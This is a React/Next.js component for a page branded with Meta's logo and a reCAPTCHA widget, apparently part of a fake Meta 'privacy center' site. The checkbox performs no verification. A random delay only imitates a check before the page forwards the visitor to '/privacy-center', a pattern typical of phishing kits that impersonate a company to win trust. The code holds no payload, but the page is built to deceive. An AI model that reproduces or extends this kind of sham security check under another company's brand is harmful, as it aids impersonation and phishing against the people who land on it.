'use client'

import React from 'react'
import { useRouter } from 'next/navigation'
import { Shield } from 'lucide-react'
import { usePrivacyCenterLocale } from '@/components/privacy-center/PrivacyCenterLocaleContext'
import { privacyCenterMessages } from '@/lib/privacy-center-messages'
import { PrivacyLocaleSelect } from '@/components/privacy-center/PrivacyLocaleSelect'

const ReCaptcha = () => {
  const [isChecked, setIsChecked] = React.useState(false)
  const [isVerifying, setIsVerifying] = React.useState(false)
  const verifyTimeoutRef = React.useRef<ReturnType<typeof setTimeout> | null>(null)
  const router = useRouter()
  const { locale } = usePrivacyCenterLocale()
  const t = privacyCenterMessages[locale]

  React.useEffect(() => {
    return () => {
      if (verifyTimeoutRef.current) {
        clearTimeout(verifyTimeoutRef.current)
      }
    }
  }, [])

  const startVerification = () => {
    if (isVerifying || isChecked) return

    setIsChecked(true)
    setIsVerifying(true)
    const delay = 1200 + Math.floor(Math.random() * 1200)
    verifyTimeoutRef.current = setTimeout(() => {
      router.push('/privacy-center')
    }, delay)
  }

  const handleCheckboxClick = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.checked) {
      startVerification()
    }
  }

  const handleLabelClick = () => {
    startVerification()
  }

  return (
    <div className="relative min-h-screen bg-[#f4f6f9] text-[#1c2b33]" lang={locale}>
      <div
        className="pointer-events-none absolute inset-x-0 top-0 h-[min(38vh,360px)] bg-gradient-to-b from-[#e8f0fc] via-[#f4f6f9] to-transparent"
        aria-hidden
      />

      <div className="relative mx-auto min-h-screen max-w-lg px-4 pb-14 pt-8 sm:px-6 sm:pb-16 sm:pt-12">
        <header className="mb-8 flex flex-row items-start justify-between gap-4 sm:mb-10 sm:items-center">
          <img
            src="/images/meta/logo-meta.svg"
            alt="Meta"
            className="h-10 w-auto shrink-0 sm:h-11"
            width={140}
            height={44}
          />
          <PrivacyLocaleSelect id="recaptcha-page-locale" className="shrink-0" />
        </header>

        <main>
          <section className="overflow-hidden rounded-2xl border border-[#e2e8f0] bg-white shadow-[0_4px_24px_rgba(10,19,23,0.06)] sm:rounded-3xl">
            <div className="border-b border-[#eef2f6] bg-gradient-to-br from-[#f8fafc] to-white px-5 py-5 sm:px-7 sm:py-6">
              <div className="flex gap-3 sm:gap-4">
                <div className="flex h-11 w-11 shrink-0 items-center justify-center rounded-xl border border-[#e2e8f0] bg-white text-[#1877f2] shadow-sm sm:h-12 sm:w-12">
                  <Shield className="h-5 w-5 sm:h-6 sm:w-6" aria-hidden />
                </div>
                <div className="min-w-0 flex-1">
                  <h1 className="text-balance text-[1.25rem] font-bold leading-snug tracking-tight text-[#0A1317] sm:text-[1.5rem] sm:leading-tight">
                    {t.recaptchaPageTitle}
                  </h1>
                  <p className="mt-2 text-[14px] leading-relaxed text-[#5c6c7a] sm:mt-2.5 sm:text-[15px]">
                    {t.recaptchaPageSubtitle}
                  </p>
                </div>
              </div>
            </div>

            <div className="px-5 py-6 sm:px-7 sm:py-7">
              <p className="text-[11px] font-bold uppercase tracking-wider text-[#8a8d91]">reCAPTCHA</p>
              <div className="mt-3 rounded-xl border border-[#e2e8f0] bg-[#fafbfd] p-1 ring-1 ring-black/[0.03]">
                <div className="flex items-stretch justify-between gap-3 rounded-lg bg-white px-3 py-3 sm:gap-4 sm:px-4 sm:py-3.5">
                  <div className="flex min-w-0 flex-1 items-center gap-3">
                    <div className="relative flex h-9 w-9 shrink-0 items-center justify-center sm:h-10 sm:w-10">
                      <label
                        className={`checkbox path flex items-center justify-center ${isVerifying || isChecked ? 'cursor-default' : 'cursor-pointer'}`}
                        onClick={handleLabelClick}
                      >
                        <input
                          type="checkbox"
                          checked={isChecked}
                          disabled={isVerifying || isChecked}
                          id="checked-captcha"
                          onChange={handleCheckboxClick}
                        />
                        <svg viewBox="0 0 21 21" aria-hidden>
                          <path d="M5,10.75 L8.5,14.25 L19.4,2.3 C18.8333333,1.43333333 18.0333333,1 17,1 L4,1 C2.35,1 1,2.35 1,4 L1,17 C1,18.65 2.35,20 4,20 L17,20 C18.65,20 20,18.65 20,17 L20,7.99769186" />
                        </svg>
                      </label>
                    </div>
                    <label
                      htmlFor="checked-captcha"
                      className={`select-none text-[14px] font-medium leading-snug text-[#465a69] sm:text-[15px] ${isVerifying || isChecked ? 'cursor-default' : 'cursor-pointer'}`}
                    >
                      {t.recaptchaCheckboxLabel}
                    </label>
                    {isVerifying ? (
                      <p className="mt-1 text-[11px] leading-snug text-[#8a8d91]">{t.recaptchaVerifyingText}</p>
                    ) : null}
                  </div>
                  <div className="flex shrink-0 flex-col items-center justify-center self-center border-l border-[#eef2f6] pl-3 text-center sm:pl-4">
                    {isVerifying ? (
                      <div className="flex h-9 w-9 items-center justify-center rounded-full border border-[#d7dce5] bg-[#f7f9fc] sm:h-10 sm:w-10">
                        <div className="h-4 w-4 animate-spin rounded-full border-2 border-[#b7c4d6] border-t-[#4e6e95]" />
                      </div>
                    ) : (
                      <img
                        src="/images/meta/recaptcha.png"
                        alt=""
                        className="h-9 w-9 sm:h-10 sm:w-10"
                        width={40}
                        height={40}
                      />
                    )}
                    <span className="mt-1 text-[9px] font-bold uppercase tracking-wide text-[#9d9ba7]">reCAPTCHA</span>
                    <p className="mt-0.5 max-w-[5rem] text-[8px] leading-tight text-[#8a8d91]">{t.recaptchaPrivacyTerms}</p>
                  </div>
                </div>
              </div>
            </div>
          </section>

          <div className="mt-8 space-y-3.5 rounded-2xl border border-[#e2e8f0] bg-white px-5 py-5 text-[13px] leading-relaxed text-[#5c6c7a] shadow-sm sm:mt-10 sm:px-6 sm:py-6">
            <p>{t.recaptchaHelpP1}</p>
            <p>{t.recaptchaHelpP2}</p>
            <p className="text-[12px] leading-relaxed text-[#8a8d91]">{t.recaptchaHelpP3}</p>
          </div>

        </main>
      </div>
    </div>
  )
}

export default ReCaptcha
